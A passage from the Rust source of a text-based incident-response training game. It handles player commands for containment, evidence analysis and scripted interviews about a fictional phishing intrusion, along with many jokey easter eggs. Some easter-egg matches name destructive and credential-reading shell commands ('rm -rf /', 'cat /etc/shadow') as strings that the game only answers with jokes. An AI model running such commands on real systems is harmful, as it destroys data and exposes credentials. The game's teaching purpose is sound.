                    "  T1003.001 - OS Credential Dumping: LSASS Memory ✓".to_string(),
                    "".to_string(),
                    "LATERAL MOVEMENT:".to_string(),
                    "  T1021.006 - Remote Services: Windows Remote Management ✓".to_string(),
                    "  T1078.002 - Valid Accounts: Domain Accounts ✓".to_string(),
                    "".to_string(),
                    "COMMAND AND CONTROL:".to_string(),
                    "  T1071.001 - Application Layer Protocol: Web Protocols ✓".to_string(),
                    "  T1573.002 - Encrypted Channel: Asymmetric Cryptography ✓".to_string(),
                    "═══════════════════════════════════════════════════════════════════".to_string(),
                ]
            }

            "contain" | "isolate" => {
                if parts.len() < 2 {
                    return vec!["[ERROR] Usage: contain <hostname or IP>".to_string()];
                }
                let target = parts[1];
                self.game.player.use_energy(5);
                self.game.player.score.blue_team_action("contain_system");
                vec![
                    format!("[CONTAIN] Isolating {} from network...", target),
                    "[CONTAIN] Disabling network adapters...".to_string(),
                    "[CONTAIN] Blocking at firewall...".to_string(),
                    format!("[SUCCESS] {} has been contained.", target),
                    "[WARN] System is now offline - remote access unavailable".to_string(),
                    format!("[SCORE] +150 points! (Total: {})", self.game.player.score.total_points),
                ]
            }

            "analyze" => {
                if parts.len() < 2 {
                    return vec!["[ERROR] Usage: analyze <evidence_id>".to_string()];
                }
                self.game.player.use_energy(15);
                self.game.player.add_stress(5);
                self.game.player.score.blue_team_action("analyze_evidence");
                self.game.player.score.blue_team_action("identify_ioc");
                self.game.player.score.blue_team_action("identify_ioc");
                vec![
                    format!("[ANALYZE] Analyzing evidence: {}", parts[1]),
                    "[ANALYZE] Computing file hash...".to_string(),
                    "[ANALYZE] Checking VirusTotal... 23/67 detections".to_string(),
                    "[ANALYZE] Extracting strings...".to_string(),
                    "[ANALYZE] Identifying imports...".to_string(),
                    "─────────────────────────────────────────────────────".to_string(),
                    "[RESULT] Malware identified: QakBot variant".to_string(),
                    "[RESULT] MITRE ATT&CK: T1059.001 (PowerShell)".to_string(),
                    "[RESULT] C2 Server: update-service[.]xyz".to_string(),
                    "[IOC] Added: SHA256 hash to indicators (+50 pts)".to_string(),
                    "[IOC] Added: update-service[.]xyz to indicators (+50 pts)".to_string(),
                    format!("[SCORE] +200 points! (Total: {})", self.game.player.score.total_points),
                ]
            }

            "interview" => {
                if parts.len() < 2 {
                    return vec![
                        "[INTERVIEW] Available personnel to interview:".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "  👤 john     - John Smith (Financial Analyst) - Initial victim".to_string(),
                        "  👤 sarah    - Sarah Chen (IT Manager) - Technical expert".to_string(),
                        "  👤 michael  - Michael Torres (CFO) - Executive sponsor".to_string(),
                        "  👤 helpdesk - IT Help Desk - First responders".to_string(),
                        "  👤 dave     - Dave Wilson (Network Admin) - Infrastructure".to_string(),
                        "  👤 lisa     - Lisa Park (HR Director) - Policy/Personnel".to_string(),
                        "  👤 ciso     - Alex Morgan (CISO) - Security leadership".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "[TIP] Use 'interview <name>' to speak with someone".to_string(),
                    ];
                }
                self.game.player.use_energy(10);
                self.game.player.score.blue_team_action("interview");
                match parts[1].to_lowercase().as_str() {
                    "john" | "smith" | "jsmith" => vec![
                        "╔══════════════════════════════════════════════════════════════╗".to_string(),
                        "║         INTERVIEW: John Smith - Financial Analyst            ║".to_string(),
                        "╚══════════════════════════════════════════════════════════════╝".to_string(),
                        "".to_string(),
                        "Location: Conference Room B".to_string(),
                        "Demeanor: Nervous, fidgeting with coffee cup".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "".to_string(),
                        "You: \"Walk me through what happened this morning.\"".to_string(),
                        "".to_string(),
                        "John: *takes a deep breath* \"I got in around 8:30, checked".to_string(),
                        "      my email like usual. There was this urgent invoice".to_string(),
                        "      from Acme Suppliers - we work with them all the time.\"".to_string(),
                        "".to_string(),
                        "You: \"What made you think it was legitimate?\"".to_string(),
                        "".to_string(),
                        "John: \"It looked exactly like their normal invoices. Same".to_string(),
                        "      format, same signature. The email even referenced our".to_string(),
                        "      latest PO number - #PO-2024-4521.\"".to_string(),
                        "".to_string(),
                        "You: \"And you opened the attachment?\"".to_string(),
                        "".to_string(),
                        "John: *looks down* \"Yeah... it was an Excel file. When I".to_string(),
                        "      opened it, there was a yellow bar asking to enable".to_string(),
                        "      editing and macros. I clicked it because I've done".to_string(),
                        "      that before with other vendor spreadsheets.\"".to_string(),
                        "".to_string(),
                        "You: \"What happened after that?\"".to_string(),
                        "".to_string(),
                        "John: \"A black window flashed on screen - just for a second.".to_string(),
                        "      Then my computer got really slow. I thought Excel".to_string(),
                        "      was just processing the file, but then Sarah from IT".to_string(),
                        "      called me about some security alert.\"".to_string(),
                        "".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "[ASSESSMENT] John appears genuinely concerned, not deceptive".to_string(),
                        "[ASSESSMENT] Victim of social engineering, not malicious insider".to_string(),
                        "[LEAD] Attackers knew internal PO number - possible prior recon".to_string(),
                        "[LEAD] Phishing email with malicious Excel macro".to_string(),
                        "[IOC] Phishing domain: acme-supp1iers.com (typosquat)".to_string(),
                    ],
                    "sarah" | "chen" | "schen" => vec![
                        "╔══════════════════════════════════════════════════════════════╗".to_string(),
                        "║         INTERVIEW: Sarah Chen - IT Manager                   ║".to_string(),
                        "╚══════════════════════════════════════════════════════════════╝".to_string(),
                        "".to_string(),
                        "Location: IT Operations Center".to_string(),
                        "Demeanor: Professional, calm under pressure".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "".to_string(),
                        "Sarah: \"I've already started pulling logs. Here's what I know.\"".to_string(),
                        "".to_string(),
                        "*She turns her monitor toward you*".to_string(),
                        "".to_string(),
                        "Sarah: \"The email came from 'invoices@acme-supp1iers.com' -".to_string(),
                        "       note the '1' instead of 'l'. Classic typosquatting.".to_string(),
                        "       Our email gateway should have caught this, but it".to_string(),
                        "       was registered recently and had valid SPF/DKIM.\"".to_string(),
                        "".to_string(),
                        "You: \"What did the EDR pick up?\"".to_string(),
                        "".to_string(),
                        "Sarah: \"EXCEL.EXE spawned powershell.exe with a base64-encoded".to_string(),
                        "       command. I've decoded it - it's a downloader that pulls".to_string(),
                        "       a second-stage payload from 'update-service.xyz'.\"".to_string(),
                        "".to_string(),
                        "You: \"Any lateral movement?\"".to_string(),
                        "".to_string(),
                        "Sarah: *frowns* \"That's what concerns me. I'm seeing the".to_string(),
                        "       svc_backup service account authenticating from John's".to_string(),
                        "       workstation to the file server. That account should".to_string(),
                        "       only be used by scheduled tasks on the backup server.\"".to_string(),
                        "".to_string(),
                        "Sarah: \"They might have dumped credentials and pivoted.\"".to_string(),
                        "".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "[ASSESSMENT] Sarah is highly competent and cooperative".to_string(),
                        "[EVIDENCE] Email gateway logs now available".to_string(),
                        "[EVIDENCE] Decoded PowerShell script available".to_string(),
                        "[EVIDENCE] svc_backup credential abuse confirmed".to_string(),
                        "[LEAD] Possible lateral movement to file server".to_string(),
                    ],
                    "michael" | "torres" | "mtorres" | "cfo" => vec![
                        "╔══════════════════════════════════════════════════════════════╗".to_string(),
                        "║         INTERVIEW: Michael Torres - CFO                      ║".to_string(),
                        "╚══════════════════════════════════════════════════════════════╝".to_string(),
                        "".to_string(),
                        "Location: Executive Conference Room".to_string(),
                        "Demeanor: Impatient, checking watch frequently".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "".to_string(),
                        "Michael: \"I have a board call in 20 minutes. What do you need?\"".to_string(),
                        "".to_string(),
                        "You: \"We're investigating a security incident that originated".to_string(),
                        "     in the Finance department. I need to understand what".to_string(),
                        "     data could be at risk.\"".to_string(),
                        "".to_string(),
                        "Michael: *sits up straighter* \"What kind of incident?\"".to_string(),
                        "".to_string(),
                        "You: \"A phishing attack that led to malware infection. We're".to_string(),
                        "     assessing if any financial data was compromised.\"".to_string(),
                        "".to_string(),
                        "Michael: \"The Finance share has everything - quarterly reports,".to_string(),
                        "        budget projections, M&A documents... Is the data encrypted?\"".to_string(),
                        "".to_string(),
                        "You: \"We're not seeing ransomware indicators, but we suspect".to_string(),
                        "     data exfiltration may have occurred.\"".to_string(),
                        "".to_string(),
                        "Michael: *turns pale* \"The merger documents... if those leak,".to_string(),
                        "        it could affect the stock price. We have regulatory".to_string(),
                        "        obligations. Do we need to disclose?\"".to_string(),
                        "".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "[ASSESSMENT] Michael is focused on business impact".to_string(),
                        "[INTEL] High-value data on Finance share: M&A documents".to_string(),
                        "[INTEL] Potential regulatory disclosure requirements".to_string(),
                        "[NOTE] Escalate to legal if data exfiltration confirmed".to_string(),
                    ],
                    "helpdesk" | "help" | "support" => vec![
                        "╔══════════════════════════════════════════════════════════════╗".to_string(),
                        "║         INTERVIEW: IT Help Desk Team                         ║".to_string(),
                        "╚══════════════════════════════════════════════════════════════╝".to_string(),
                        "".to_string(),
                        "Location: IT Support Area".to_string(),
                        "Present: Marcus (Senior Tech), Jenny (Tier 1)".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "".to_string(),
                        "You: \"Did anyone contact Help Desk about this incident?\"".to_string(),
                        "".to_string(),
                        "Marcus: \"Yeah, John called around 9:15. Said his computer".to_string(),
                        "        was acting weird after opening an email. We didn't".to_string(),
                        "        think much of it at first - people say that a lot.\"".to_string(),
                        "".to_string(),
                        "Jenny: \"I also got a weird call about 30 minutes ago. Someone".to_string(),
                        "       claimed to be from IT security, asking about our EDR".to_string(),
                        "       policies. I didn't recognize the voice.\"".to_string(),
                        "".to_string(),
                        "You: \"Did you give them any information?\"".to_string(),
                        "".to_string(),
                        "Jenny: \"No, they were asking for admin passwords. I said I".to_string(),
                        "       needed to verify their identity first and they hung up.\"".to_string(),
                        "".to_string(),
                        "Marcus: \"Good catch, Jenny. That sounds like social engineering.\"".to_string(),
                        "".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "[ASSESSMENT] Help Desk followed security procedures".to_string(),
                        "[FINDING] Possible social engineering call - attackers may be".to_string(),
                        "          probing for additional access vectors".to_string(),
                        "[LEAD] Attackers are actively working the target - time sensitive!".to_string(),
                    ],
                    "dave" | "wilson" | "network" => vec![
                        "╔══════════════════════════════════════════════════════════════╗".to_string(),
                        "║         INTERVIEW: Dave Wilson - Network Admin               ║".to_string(),
                        "╚══════════════════════════════════════════════════════════════╝".to_string(),
                        "".to_string(),
                        "Location: Network Operations Center".to_string(),
                        "Demeanor: Tired (night shift), drinking Red Bull".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "".to_string(),
                        "Dave: \"I've been watching the traffic since Sarah called.".to_string(),
                        "      Something's definitely off.\"".to_string(),
                        "".to_string(),
                        "*He pulls up a network graph on his screen*".to_string(),
                        "".to_string(),
                        "Dave: \"See this? WS-JSMITH has been beaconing to an external".to_string(),
                        "      IP every 30 seconds. The packets are encrypted, but".to_string(),
                        "      the pattern is textbook C2 traffic.\"".to_string(),
                        "".to_string(),
                        "You: \"Can you block it at the firewall?\"".to_string(),
                        "".to_string(),
                        "Dave: \"Already done. But here's the thing - I'm also seeing".to_string(),
                        "      traffic from the file server to the same IP. Whatever".to_string(),
                        "      this is, it's already spread.\"".to_string(),
                        "".to_string(),
                        "Dave: \"I can give you full packet captures if you need them.\"".to_string(),
                        "".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "[ASSESSMENT] Dave is proactive and security-aware".to_string(),
                        "[FINDING] C2 traffic confirmed from multiple hosts".to_string(),
                        "[ACTION] External C2 IP blocked at firewall".to_string(),
                        "[EVIDENCE] Full packet captures available".to_string(),
                        "[LEAD] File server (SRV-FS01) is also compromised!".to_string(),
                    ],
                    "lisa" | "park" | "hr" => vec![
                        "╔══════════════════════════════════════════════════════════════╗".to_string(),
                        "║         INTERVIEW: Lisa Park - HR Director                   ║".to_string(),
                        "╚══════════════════════════════════════════════════════════════╝".to_string(),
                        "".to_string(),
                        "Location: HR Office".to_string(),
                        "Demeanor: Concerned, taking careful notes".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "".to_string(),
                        "Lisa: \"Security incidents always worry me from an HR".to_string(),
                        "      perspective. What do I need to know?\"".to_string(),
                        "".to_string(),
                        "You: \"We're investigating a phishing attack. John Smith".to_string(),
                        "     was the initial victim. It wasn't his fault - the".to_string(),
                        "     attack was sophisticated.\"".to_string(),
                        "".to_string(),
                        "Lisa: \"I appreciate you saying that. John's been with us".to_string(),
                        "      for 8 years. He's not careless.\"".to_string(),
                        "".to_string(),
                        "You: \"Has anyone requested unusual access recently? New".to_string(),
                        "     employees, contractors, access changes?\"".to_string(),
                        "".to_string(),
                        "Lisa: *checks her system* \"Nothing out of the ordinary.".to_string(),
                        "      Although... we did have an unusual request last week.".to_string(),
                        "      Someone claiming to be from the auditing firm asked".to_string(),
                        "      for an org chart. I sent it before realizing I should".to_string(),
                        "      verify.\"".to_string(),
                        "".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "[ASSESSMENT] Lisa may have inadvertently helped reconnaissance".to_string(),
                        "[FINDING] Org chart provided to unknown party - social engineering".to_string(),
                        "[LEAD] Attackers conducted prior reconnaissance (org chart)".to_string(),
                        "[NOTE] Consider security awareness refresher training".to_string(),
                    ],
                    "alex" | "ciso" | "morgan" => vec![
                        "╔══════════════════════════════════════════════════════════════╗".to_string(),
                        "║         INTERVIEW: Alex Morgan - CISO                        ║".to_string(),
                        "╚══════════════════════════════════════════════════════════════╝".to_string(),
                        "".to_string(),
                        "Location: CISO's Office".to_string(),
                        "Demeanor: Serious but supportive".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "".to_string(),
                        "Alex: \"Walk me through what you've found so far.\"".to_string(),
                        "".to_string(),
                        "*You brief Alex on the incident*".to_string(),
                        "".to_string(),
                        "Alex: \"Sounds like a well-planned operation. The PO number".to_string(),
                        "      in the phishing email tells me they did their homework.".to_string(),
                        "      This isn't random - we were targeted.\"".to_string(),
                        "".to_string(),
                        "You: \"Any idea why?\"".to_string(),
                        "".to_string(),
                        "Alex: \"We're in the middle of a major acquisition. That's".to_string(),
                        "      not public, but someone could have figured it out.".to_string(),
                        "      Financial data is extremely valuable right now.\"".to_string(),
                        "".to_string(),
                        "Alex: \"I'm declaring this a P1 incident. You have full".to_string(),
                        "      authority to contain and investigate. I'll handle".to_string(),
                        "      executive communication and legal.\"".to_string(),
                        "".to_string(),
                        "Alex: \"Keep me updated every hour. And don't worry about".to_string(),
                        "      overtime - whatever it takes to stop this.\"".to_string(),
                        "".to_string(),
                        "─────────────────────────────────────────────────────".to_string(),
                        "[ASSESSMENT] Full executive support for investigation".to_string(),
                        "[INTEL] Possible motive: M&A data theft".to_string(),
                        "[STATUS] Incident elevated to P1 (Critical)".to_string(),
                        "[AUTH] Full containment authority granted".to_string(),
                    ],
                    _ => vec![
                        format!("[ERROR] Unknown person: {}", parts[1]),
                        "[TIP] Use 'interview' without arguments to see available personnel".to_string(),
                    ],
                }
            }

            "evidence" => {
                vec![
                    "[EVIDENCE] Collected evidence:".to_string(),
                    "─────────────────────────────────────────────────────".to_string(),
                    "  [001] Phishing email (From: invoices@acme-supp1iers.com)".to_string(),
                    "  [002] Malicious Excel attachment: Invoice_Q4.xlsm".to_string(),
                    "  [003] EDR Alert: Suspicious PowerShell execution".to_string(),
                    "  [004] Network log: Connection to 185.234.xx.xx:443".to_string(),
                    "─────────────────────────────────────────────────────".to_string(),
                    "[TIP] Use 'analyze <id>' to examine evidence".to_string(),
                ]
            }

            "iocs" | "indicators" => {
                vec![
                    "[IOC] Indicators of Compromise:".to_string(),
                    "─────────────────────────────────────────────────────".to_string(),
                    "  [IP]     185.234.xx.xx (C2 Server)".to_string(),
                    "  [DOMAIN] acme-supp1iers.com (Phishing)".to_string(),
                    "  [DOMAIN] update-service.xyz (C2)".to_string(),
                    "  [EMAIL]  invoices@acme-supp1iers.com".to_string(),
                    "  [FILE]   Invoice_Q4.xlsm (Dropper)".to_string(),
                    "  [HASH]   a1b2c3d4... (Malware SHA256)".to_string(),
                    "─────────────────────────────────────────────────────".to_string(),
                ]
            }

            "coffee" | "break" => {
                self.game.player.drink_coffee();
                if self.game.player.coffee_consumed > 5 {
                    vec![
                        "[ACTION] ☕ Drinking coffee... (maybe too much?)".to_string(),
                        format!("[STATUS] Energy: {}% (+20)", self.game.player.energy),
                        format!("[STATUS] Stress: {}% (+5 from caffeine jitters)", self.game.player.stress),
                        format!("[STATUS] Total coffees: {}", self.game.player.coffee_consumed),
                    ]
                } else {
                    vec![
                        "[ACTION] ☕ Taking a coffee break...".to_string(),
                        format!("[STATUS] Energy: {}% (+20)", self.game.player.energy),
                        format!("[STATUS] Total coffees: {}", self.game.player.coffee_consumed),
                    ]
                }
            }

            "note" | "hypothesis" => {
                if parts.len() < 2 {
                    return vec!["[ERROR] Usage: note <your note text>".to_string()];
                }
                let note_text = parts[1..].join(" ");
                vec![
                    format!("[NOTE] Added: {}", note_text),
                ]
            }

            "timeline" => {
                vec![
                    "[TIMELINE] Incident Timeline:".to_string(),
                    "═══════════════════════════════════════════════════════".to_string(),
                    "  08:42  Email received by John Smith".to_string(),
                    "  08:45  Email opened, attachment downloaded".to_string(),
                    "  08:46  Macro enabled, PowerShell executed".to_string(),
                    "  08:47  C2 beacon established to 185.234.xx.xx".to_string(),
                    "  08:52  Scheduled task created for persistence".to_string(),
                    "  09:15  EDR Alert triggered (You are here)".to_string(),
                    "  ??:??  [UNKNOWN] What happens next is up to you...".to_string(),
                    "═══════════════════════════════════════════════════════".to_string(),
                ]
            }

            "achievements" | "trophies" => {
                self.show_achievements()
            }

            "score" | "points" => {
                let score = &self.game.player.score;
                let grade = score.grade();
                vec![
                    "╔══════════════════════════════════════════════════════════════╗".to_string(),
                    "║                    📊 CURRENT SCORE 📊                       ║".to_string(),
                    "╠══════════════════════════════════════════════════════════════╣".to_string(),
                    format!("║  Total Points: {:<41} ║", format!("{} pts", score.total_points)),
                    format!("║  Grade: {:<48} ║", grade),
                    "╠──────────────────────────────────────────────────────────────╣".to_string(),
                    "║  BREAKDOWN:                                                  ║".to_string(),
                    format!("║    Evidence collected:    {:<5} (+{} pts)                 ║",
                           score.evidence_collected, score.evidence_collected * 50),
                    format!("║    Evidence analyzed:     {:<5} (+{} pts)                ║",
                           score.evidence_analyzed, score.evidence_analyzed * 100),
                    format!("║    Systems contained:     {:<5} (+{} pts)                ║",
                           score.systems_contained, score.systems_contained * 150),
                    format!("║    Interviews conducted:  {:<5} (+{} pts)                 ║",
                           score.interviews_conducted, score.interviews_conducted * 75),
                    format!("║    IOCs identified:       {:<5} (+{} pts)                 ║",
                           score.iocs_identified, score.iocs_identified * 50),
                    "╠──────────────────────────────────────────────────────────────╣".to_string(),
                    "║  GRADE SCALE:                                                ║".to_string(),
                    "║    S: 1500+  A: 1200+  B: 900+  C: 600+  D: 300+  F: <300   ║".to_string(),
                    "╚══════════════════════════════════════════════════════════════╝".to_string(),
                ]
            }

            // Easter Eggs! 🥚
            "matrix" | "neo" => {
                self.game.player.find_easter_egg("matrix");
                vec![
                    "".to_string(),
                    "  Wake up, Neo...".to_string(),
                    "  The Matrix has you...".to_string(),
                    "  Follow the white rabbit.".to_string(),
                    "".to_string(),
                    "  🐰 Knock, knock.".to_string(),
                    "".to_string(),
                    "[ACHIEVEMENT] 🐰 The Matrix - There is no spoon".to_string(),
                ]
            }

            "hack" | "hacktheplanet" | "hack the planet" => {
                self.game.player.find_easter_egg("hacktheplanet");
                vec![
                    "".to_string(),
                    "  ╔═══════════════════════════════════════╗".to_string(),
                    "  ║      HACK THE PLANET! 🌍             ║".to_string(),
                    "  ║                                       ║".to_string(),
                    "  ║   \"Mess with the best,               ║".to_string(),
                    "  ║    die like the rest.\"               ║".to_string(),
                    "  ║              - Dade Murphy, 1995      ║".to_string(),
                    "  ╚═══════════════════════════════════════╝".to_string(),
                    "".to_string(),
                ]
            }

            "sudo" => {
                self.game.player.find_easter_egg("sudo");
                vec![
                    "[sudo] password for analyst: ".to_string(),
                    "[sudo] Nice try. This incident isn't going to let you".to_string(),
                    "       sudo your way out of it.".to_string(),
                ]
            }

            "rm -rf /" | "rm -rf" => {
                self.game.player.find_easter_egg("rm");
                vec![
                    "[ERROR] Nice try. We're investigating an incident,".to_string(),
                    "        not causing one.".to_string(),
                    "[TIP] Maybe try 'contain' instead of 'destroy'?".to_string(),
                ]
            }

            "exit" | "quit" | "q" => {
                vec![
                    "[SYSTEM] Use Esc to pause or 'q' from main menu to quit.".to_string(),
                    "[SYSTEM] An analyst never quits mid-investigation!".to_string(),
                ]
            }

            "whoami" => {
                vec![
                    format!("[SYSTEM] {}", self.game.player.name),
                    format!("[SYSTEM] Title: {}", self.game.player.title),
                    format!("[SYSTEM] Reputation: {}/100", self.game.player.reputation),
                ]
            }

            "pwd" => {
                vec!["[SYSTEM] /home/analyst/incident_2024_1337/".to_string()]
            }

            "ls" => {
                vec![
                    "[SYSTEM] drwxr-xr-x  evidence/".to_string(),
                    "[SYSTEM] drwxr-xr-x  logs/".to_string(),
                    "[SYSTEM] drwxr-xr-x  malware_samples/".to_string(),
                    "[SYSTEM] -rw-r--r--  notes.txt".to_string(),
                    "[SYSTEM] -rw-r--r--  timeline.md".to_string(),
                    "[TIP] Use 'evidence' to see collected evidence".to_string(),
                ]
            }

            "ping" => {
                vec![
                    "PING localhost (127.0.0.1) 56(84) bytes of data.".to_string(),
                    "64 bytes from localhost: icmp_seq=1 ttl=64 time=0.042 ms".to_string(),
                    "64 bytes from localhost: icmp_seq=2 ttl=64 time=0.038 ms".to_string(),
                    "[TIP] Everything looks fine locally...".to_string(),
                    "[TIP] Try 'scan' to check remote systems".to_string(),
                ]
            }

            "sl" => {
                self.game.player.find_easter_egg("sl");
                vec![
                    "      ====        ________                ___________ ".to_string(),
                    "  _D _|  |_______/        \\__I_I_____===__|_________| ".to_string(),
                    "   |(_)---  |   H\\________/ |   |        =|___ ___|   ".to_string(),
                    "   /     |  |   H  |  |     |   |         ||_| |_||   ".to_string(),
                    "  |      |  |   H  |__--------------------| [___] |   ".to_string(),
                    "  | ________|___H__/__|_____/[][]~\\_______|       |   ".to_string(),
                    "  |/ |   |-----------I_____I [][] []  D   |=======|__ ".to_string(),
                    "".to_string(),
                    "[SYSTEM] You typed 'sl' instead of 'ls'. Classic.".to_string(),
                ]
            }

            "cipher" => {
                self.game.player.find_easter_egg("cipher");
                vec![
                    "".to_string(),
                    "  ╔═══════════════════════════════════════════════════╗".to_string(),
                    "  ║                                                   ║".to_string(),
                    "  ║   Created with ❤️ by Cipher                       ║".to_string(),
                    "  ║   For Ryan                                        ║".to_string(),
                    "  ║                                                   ║".to_string(),
                    "  ║   \"Stay curious, stay vigilant.\"                  ║".to_string(),
                    "  ║                                                   ║".to_string(),
                    "  ╚═══════════════════════════════════════════════════╝".to_string(),
                    "".to_string(),
                ]
            }

            "42" | "meaning" => {
                self.game.player.find_easter_egg("42");
                vec![
                    "[SYSTEM] The answer to the ultimate question of".to_string(),
                    "         life, the universe, and incident response.".to_string(),
                ]
            }

            "xyzzy" => {
                self.game.player.find_easter_egg("xyzzy");
                vec![
                    "[SYSTEM] Nothing happens.".to_string(),
                    "[SYSTEM] (You were expecting Colossal Cave Adventure?)".to_string(),
                ]
            }

            // More Easter eggs!
            "cowsay" | "cow" => {
                self.game.player.find_easter_egg("cowsay");
                vec![
                    " _______________________________________".to_string(),
                    "< Security is a process, not a product >".to_string(),
                    " ---------------------------------------".to_string(),
                    "        \\   ^__^".to_string(),
                    "         \\  (oo)\\_______".to_string(),
                    "            (__)\\       )\\/\\".to_string(),
                    "                ||----w |".to_string(),
                    "                ||     ||".to_string(),
                ]
            }

            "fortune" => {
                self.game.player.find_easter_egg("fortune");
                let fortunes = [
                    "The best incident response is the one you never need.",
                    "In security, paranoia is just good planning.",
                    "Trust, but verify. Then verify again.",
                    "The weakest link is usually between the keyboard and chair.",
                    "Passwords are like underwear: change them often.",
                    "There are only two types of companies: those that have been breached, and those that don't know it yet.",
                ];
                let fortune = fortunes[self.game.player.coffee_consumed as usize % fortunes.len()];
                vec![
                    "".to_string(),
                    format!("  \"{}\"", fortune),
                    "".to_string(),
                    "        - Ancient Security Proverb".to_string(),
                    "".to_string(),
                ]
            }

            "uptime" => {
                vec![
                    " 09:42:37 up 127 days, 14:23,  1 user,  load average: 0.42, 0.37, 0.31".to_string(),
                    "[NOTE] Unlike this server, you probably need sleep.".to_string(),
                ]
            }

            "date" => {
                vec![
                    "Mon Jan  6 09:42:37 UTC 2025".to_string(),
                    "[NOTE] Time flies when you're chasing threats.".to_string(),
                ]
            }

            "uuddlrlrba" | "konami" | "upupdowndownleftrightleftrightba" => {
                self.game.player.find_easter_egg("konami");
                use crate::data::player::Achievement;
                self.game.player.unlock_achievement(Achievement::L33tHax0r);
                vec![
                    "".to_string(),
                    "╔═══════════════════════════════════════════════════════════╗".to_string(),
                    "║                                                           ║".to_string(),
                    "║   ↑ ↑ ↓ ↓ ← → ← → B A                                    ║".to_string(),
                    "║                                                           ║".to_string(),
                    "║         +30 EXTRA LIVES                                   ║".to_string(),
                    "║                                                           ║".to_string(),
                    "║   Just kidding. But you unlocked an achievement!          ║".to_string(),
                    "║                                                           ║".to_string(),
                    "╚═══════════════════════════════════════════════════════════╝".to_string(),
                    "".to_string(),
                    "[ACHIEVEMENT] 💀 L33T HAX0R - You know the code!".to_string(),
                ]
            }

            "glitch" | "corrupt" => {
                self.game.player.find_easter_egg("glitch");
                vec![
                    "".to_string(),
                    "S̷̨̛Y̴̢͝S̸̛͜T̴̡̕E̴̡͝M̸̨̛ ̵̧͠E̵̢͠R̷̨̕R̴̢̛O̸̧͠R̸̨̕".to_string(),
                    "M̷̨̛A̵̢͠Ļ̸̕F̶̨̛U̸̡͝N̵̢̕C̸̨̛T̷̡͠I̵̧̕O̴̢͝N̸̨̛ ̵̧͝D̸̨̕E̴̢̛T̵̡͝Ȩ̸̕C̷̨̛T̴̢͠Ȩ̸̕D̷̨̛".to_string(),
                    "R̶̨̛E̵̢͠B̸̧̕Ǫ̷̛O̴̢͝T̸̨̛I̵̡͠Ņ̸̕G̷̨̛.̴̢͝.̸̧̕.̷̨̛".to_string(),
                    "".to_string(),
                    "[SYSTEM] Just kidding. Everything is fine.".to_string(),
                    "[SYSTEM] ...probably.".to_string(),
                ]
            }

            "mrrobot" | "mr robot" | "fsociety" | "elliot" => {
                self.game.player.find_easter_egg("mrrobot");
                vec![
                    "".to_string(),
                    "  ╔═══════════════════════════════════════╗".to_string(),
                    "  ║                                       ║".to_string(),
                    "  ║   \"Hello, friend.\"                    ║".to_string(),
                    "  ║                                       ║".to_string(),
                    "  ║   That's lame. Maybe I should         ║".to_string(),
                    "  ║   give you a name. But that's a       ║".to_string(),
                    "  ║   slippery slope...                   ║".to_string(),
                    "  ║                                       ║".to_string(),
                    "  ║        - Elliot Alderson              ║".to_string(),
                    "  ║                                       ║".to_string(),
                    "  ╚═══════════════════════════════════════╝".to_string(),
                    "".to_string(),
                ]
            }

            "i know kung fu" | "kungfu" | "kung fu" => {
                self.game.player.find_easter_egg("kungfu");
                vec![
                    "".to_string(),
                    "  Morpheus: \"Show me.\"".to_string(),
                    "".to_string(),
                    "  [You've learned: Incident Response Fu]".to_string(),
                    "  [Skills improved but you're still in the matrix]".to_string(),
                    "".to_string(),
                ]
            }

            "ducky" | "rubberducky" | "rubber ducky" | "quack" => {
                self.game.player.find_easter_egg("ducky");
                vec![
                    "".to_string(),
                    "    >(')____,".to_string(),
                    "     (` =~~~ )".to_string(),
                    "      `-^--'`".to_string(),
                    "".to_string(),
                    "  🦆 QUACK! 🦆".to_string(),
                    "".to_string(),
                    "  The USB Rubber Ducky says hello!".to_string(),
                    "  Remember: Not all ducks are friendly.".to_string(),
                    "".to_string(),
                ]
            }

            "make me a sandwich" | "sandwich" => {
                self.game.player.find_easter_egg("sandwich");
                vec![
                    "[SYSTEM] What? Make it yourself.".to_string(),
                    "[TIP] Try 'sudo make me a sandwich'".to_string(),
                ]
            }

            "sudo make me a sandwich" => {
                self.game.player.find_easter_egg("sudosandwich");
                vec![
                    "[SYSTEM] Okay.".to_string(),
                    "".to_string(),
                    "  🥪 Here's your sandwich. 🥪".to_string(),
                    "".to_string(),
                    "[NOTE] With great power comes great sandwiches.".to_string(),
                ]
            }

            "apt" | "apt-get" => {
                vec![
                    "[SYSTEM] E: Could not open lock file /var/lib/dpkg/lock".to_string(),
                    "[SYSTEM] Just kidding. This isn't a Linux box.".to_string(),
                    "[TIP] Try 'apt-get coffee' instead".to_string(),
                ]
            }

            "apt-get coffee" | "apt install coffee" => {
                self.game.player.find_easter_egg("aptcoffee");
                self.game.player.drink_coffee();
                vec![
                    "Reading package lists... Done".to_string(),
                    "Building dependency tree... Done".to_string(),
                    "The following NEW packages will be installed:".to_string(),
                    "  coffee-extra-strong caffeine-boost energy-drink".to_string(),
                    "0 upgraded, 3 newly installed, 0 to remove".to_string(),
                    "Do you want to continue? [Y/n] Y".to_string(),
                    "".to_string(),
                    "Setting up coffee-extra-strong (3.14.159)...".to_string(),
                    "Processing triggers for caffeine-boost...".to_string(),
                    "".to_string(),
                    "[SUCCESS] ☕ Coffee installed successfully!".to_string(),
                    format!("[STATUS] Energy: {}%", self.game.player.energy),
                ]
            }

            "vim" | "emacs" | "nano" => {
                vec![
                    "[SYSTEM] This is an incident response console, not a text editor.".to_string(),
                    "[SYSTEM] But for the record, vim is superior.".to_string(),
                    "[SYSTEM] ...fight me.".to_string(),
                ]
            }

            "cat /etc/passwd" | "cat /etc/shadow" => {
                self.game.player.find_easter_egg("catpasswd");
                vec![
